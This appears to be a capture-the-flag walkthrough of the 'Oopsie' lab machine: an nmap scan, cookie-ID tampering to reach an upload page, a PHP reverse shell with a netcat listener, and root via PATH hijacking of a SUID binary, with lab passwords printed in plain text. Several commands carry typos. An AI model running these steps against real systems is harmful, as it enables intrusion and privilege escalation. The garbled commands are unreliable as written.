# Oopsie (Linux)

## Overview

- ..


## Scanning 

```bash
# Nmap 7.91 scan initiated Tue Aug 24 14:27:02 2021 as: nmap -T4 -p- -A -oA nmap/scan 10.10.10.28
Warning: 10.10.10.28 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.28 (10.10.10.28)
Host is up (0.25s latency).
Not shown: 65528 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
6887/tcp  filtered unknown
25888/tcp filtered unknown
36624/tcp filtered unknown
53735/tcp filtered unknown
64127/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

--- Deleted OS Info bloat ---

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   249.40 ms 10.10.14.1 (10.10.14.1)
2   250.76 ms 10.10.10.28 (10.10.10.28)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 24 14:42:01 2021 -- 1 IP address (1 host up) scanned in 899.37 seconds

```

## Enumeration

1. Visit the site, realize that there is a login page somewhere because of the details on the last paragraph
2. Use dirbuster to discover hidden directories
3. Find `/cdn-cgi/login/index.php`
4. Try logging in with details from previous box (archetype) *admin:MEGACORP_4dm1n!!* 
5. After looking around, we realize that there is an uploads folder that can only be accessed by a *super admin*
6. We realize that on the accounts page, the website is using a cookie identification system with the `id` parameter.
7. Open this up in burpsuite and we realize that we can change the `id` parameter to get the `Access ID` for different users, we attempt to run this through the intruder.
8. Send `accounts` request to intruder, set the $ on the `id` tag, generate a list of numbers from 1-100 (using whatever method, see below for using bash):
> ```bash 
for seq 1 100; do echo $i; done 

9. Paste numbers 1-100 in payloads (simple list) tab, configure options to follow redirects. 
10. Inspect all responses looking for *superadmin* and we discover the `id` is 30 and `Access ID = 86575`
11. Intercept request for uploads page and modify cookie parameters with Access ID of 86575.
12. We have got access to this page.
13. Since it's php, we try uploading a php reverse shell. 
14. Modify upload request with the same Access ID.
15. Setup netcat on attacker machine `nc -lvnp 1234`
16. Visit the `/uploads/shell.php` page, we got access to the box!
17. `cat /home/robert/user.txt`
18. Change shell prompt to make it more simpler: 
```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```
19. Attempt to privesc to gain root privs:
- Download linpeas on host
- Host via python
- Download via wget on victim machine with `tee result.txt`
- Analyze:
Realize that there is an unidentified binary `/usr/bin/bugtracker` however we cannot run it as we are not robert.
20. Try to find roberts login details: `cd /var/www/html/cdn-cgi/login` and `cat db.php`
21. Discover roberts login details:

![[Pasted image 20210825132921.png]]

22. Run `su robert` with the password.
23. Then run `/usr/bin/bugtracker`
24. Run `strings /usr/bin/bugtracker` and realize that it runs `cat /root/report`
25. Create a malicious `cat` binary which will provide us with root privs:
```bash
exportPATH=/tmp:$PATH
cd /tmp/
echo'/bin/sh' > cat
chmod+x cat
```
26. `/usr/bin/bugtracker, input:1`
27. Run `less /root/root.txt`
28. Post Exploitation:

- Discover .config folder with details about a ftp user (possibly for attacking the next machine):


*user: ftpuser*
*pass: mc@F1l3ZilL4*
